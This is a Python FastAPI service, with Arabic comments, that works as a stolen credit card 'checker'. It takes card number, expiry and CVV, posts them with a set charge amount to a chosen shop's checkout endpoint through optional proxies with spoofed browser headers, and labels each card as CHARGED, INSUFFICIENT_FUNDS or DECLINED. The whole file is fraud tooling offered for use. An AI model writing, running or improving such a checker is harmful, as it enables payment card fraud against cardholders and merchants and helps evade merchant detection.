from fastapi import FastAPI, Query, Request
import httpx

app = FastAPI()

GATEWAY_PRICES = {"Shopify": "31.0", "AuthNet": "20.0", "PayPal": "10.0"}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": "https://www.google.com/",
    "Connection": "keep-alive"
}

@app.api_route("/check", methods=["GET", "POST"])
async def check_card(request: Request, cc: str = Query(...), site: str = Query(...), proxy: str = Query(None), gateway: str = Query("Shopify")):
    price = GATEWAY_PRICES.get(gateway, "31.0")
    
    try:
        if not site.startswith("http"):
            site = f"https://{site}"
            
        cc_parts = cc.split('|')
        payload = {
            "card_number": cc_parts[0],
            "exp_month": cc_parts[1],
            "exp_year": cc_parts[2],
            "cvv": cc_parts[3],
            "amount": price
        }

        formatted_proxy = None
        if proxy:
            clean_proxy = proxy.strip().replace("http://", "").replace("https://", "")
            if "@" in clean_proxy:
                formatted_proxy = f"http://{clean_proxy}"
            else:
                parts = clean_proxy.split(":")
                if len(parts) == 4:
                    formatted_proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                else:
                    formatted_proxy = f"http://{clean_proxy}"
                    
        transport = httpx.AsyncHTTPTransport(proxy=formatted_proxy) if formatted_proxy else None

        async with httpx.AsyncClient(transport=transport, headers=HEADERS, timeout=30.0, follow_redirects=True) as client:
            target_url = f"{site}/cart/checkout"
            response = await client.post(target_url, data=payload)
            
            resp_msg = "CARD_DECLINED"
            status = "false"
            
            # محاولة التحليل كـ JSON أولاً
            try:
                data = response.json()
                if data.get("success") == True or data.get("status") == "succeeded":
                    resp_msg = "CHARGED"
                    status = "true"
                elif "insufficient" in str(data).lower():
                    resp_msg = "INSUFFICIENT_FUNDS"
                    status = "false"
                else:
                    resp_msg = data.get("message") or data.get("error") or "CARD_DECLINED"
            except:
                # إذا فشل الـ JSON، نحلل نص الصفحة (HTML)
                res_text = response.text.lower()
                if any(k in res_text for k in ["thank you", "success", "order confirmation", "charged"]):
                    resp_msg = "CHARGED"
                    status = "true"
                elif any(k in res_text for k in ["declined", "invalid", "error", "failed", "insufficient"]):
                    resp_msg = "CARD_DECLINED"
                    status = "false"
            
            return {
                "Gateway": gateway,
                "Price": price,
                "Proxy": "Live" if proxy else "None",
                "Response": resp_msg,
                "Status": status,
                "CC": cc
            }

    except Exception as e:
        return {
            "Gateway": gateway,
            "Price": price,
            "Proxy": "Error",
            "Response": "CARD_DECLINED",
            "Status": "false",
            "CC": cc
        }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
